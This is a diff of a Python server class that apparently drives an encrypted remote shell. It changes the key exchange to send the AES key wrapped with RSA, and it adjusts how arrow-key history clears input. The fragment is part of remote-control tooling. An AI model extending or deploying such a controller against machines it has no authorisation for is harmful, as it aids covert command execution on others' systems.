@@ -20,10 +20,10 @@ class Server(Thread):
         th = Thread(target=self.key_event)
         th.start()
 
-    def connect(self, *kwargs):
+    def connect(self):
         self.conn, addr = self.conn.accept()
         print('[+]We got a connection from', addr)
-        self.conn.send(AESFunc_server(enc_key.encode('ISO-8859-1', errors='ignore')))
+        self.conn.send(RSAFunc_server(enc_key.encode('ISO-8859-1', errors='ignore'))) # Sending the AES key with RSA encryption
         while True:
             try:
                 self.cwd = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore')
@@ -103,7 +103,7 @@ class Server(Thread):
 
     def on_press(self, key):
         if key == Key.up:
-            for i in range(len(self.current_input) + 10):
+            for i in range(len(self.current_input)):
                 self.controller.press(Key.backspace)
                 self.controller.release(Key.backspace)
             self.current_input = ''
@@ -112,7 +112,7 @@ class Server(Thread):
                 self.controller.release(char)
                 self.current_input += char
         elif key == Key.down:
-            for i in range(len(self.current_input) + 10):
+            for i in range(len(self.current_input)):
                 self.controller.press(Key.backspace)
                 self.controller.release(Key.backspace)
             self.current_input = ''
